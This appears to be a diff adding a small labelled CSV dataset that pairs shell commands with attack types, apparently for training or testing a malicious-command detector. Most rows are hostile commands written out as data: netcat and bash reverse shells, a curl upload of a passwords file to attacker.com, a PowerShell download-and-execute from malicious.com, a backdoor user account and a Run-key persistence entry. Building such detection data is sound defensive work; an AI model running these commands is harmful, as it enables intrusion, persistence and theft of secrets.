@@ -1,0 +1,22 @@
+command,attack_type
+Start-Process PowerShell -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass',keystroke_injection
+cmd.exe /c net user hacker P@ssword123 /add,keystroke_injection
+chrome.exe,benign
+nc -e /bin/sh 192.168.1.100 4444,reverse_shell
+runas /user:Administrator cmd.exe,privilege_escalation
+ipconfig /all,benign
+curl -X POST -d @passwords.txt http://attacker.com/upload,data_exfiltration
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d C:\malware.exe,keystroke_injection
+whoami /priv,privilege_escalation
+cd Documents,benign
+ping google.com,benign
+notepad.exe,benign
+explorer.exe,benign
+bash -i >& /dev/tcp/192.168.1.100/4444 0>&1,reverse_shell
+scp secret.zip user@192.168.1.5:/tmp/,data_exfiltration
+powershell -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.com'),reverse_shell
+exploit/windows/local/bypassuac,privilege_escalation
+ftp -n -s:script.txt,data_exfiltration
+powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <base64_payload>,keystroke_injection
+copy file.txt backup.txt,benign
+dir,benign
